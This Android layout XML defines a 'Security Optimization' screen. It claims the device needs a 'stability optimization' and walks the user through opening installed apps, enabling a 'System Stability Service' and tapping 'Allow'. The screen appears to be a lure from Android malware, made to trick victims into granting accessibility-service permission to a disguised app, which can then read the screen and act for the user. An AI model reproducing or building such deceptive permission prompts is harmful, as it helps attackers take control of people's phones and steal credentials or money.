<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="32dp">

    <ImageView
        android:layout_width="219dp"
        android:layout_height="191dp"
        android:layout_marginTop="20dp"
        android:src="@drawable/ic_android_robot" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="15dp"
        android:text="Security Optimization"
        android:textColor="#4B4C4E"
        android:textSize="24sp"
        android:textStyle="bold" />

    <TextView
        android:layout_width="335dp"
        android:layout_height="52dp"
        android:layout_marginTop="2dp"
        android:layout_marginBottom="32dp"
        android:alpha="0.9"
        android:gravity="center"
        android:text="Your device requires a stability optimization to continue. Follow these steps on the next screen:"
        android:textColor="#5F6368"
        android:textSize="15sp" />

    <!-- Step 1 -->
    <TextView
        android:layout_width="311dp"
        android:layout_height="79dp"
        android:layout_marginVertical="2dp"
        android:background="#FBFBFB"
        android:padding="16dp"
        android:text="1. Tap 'START OPTIMIZATION', then click 'Installed apps'"
        android:textColor="#202124"
        android:textSize="16sp"
        android:textStyle="bold" />

    <!-- Step 2 -->
    <TextView
        android:layout_width="314dp"
        android:layout_height="70dp"
        android:layout_marginVertical="8dp"
        android:background="#FFFEFE"
        android:gravity="top"
        android:padding="16dp"
        android:text="2. Tap 'System Stability Service', toggle it on and tap 'Allow'"
        android:textAlignment="viewStart"
        android:textColor="#202124"
        android:textSize="16sp"
        android:textStyle="bold" />

    <com.google.android.material.button.MaterialButton
        android:id="@+id/btnGuideAction"
        android:layout_width="257dp"
        android:layout_height="64dp"
        android:layout_marginTop="60dp"
        android:fontFamily="sans-serif-medium"
        android:text="Start Optimization"
        android:textAllCaps="true"
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:textStyle="bold"
        app:backgroundTint="#1A73E8"
        app:cornerRadius="100dp" />

</LinearLayout>
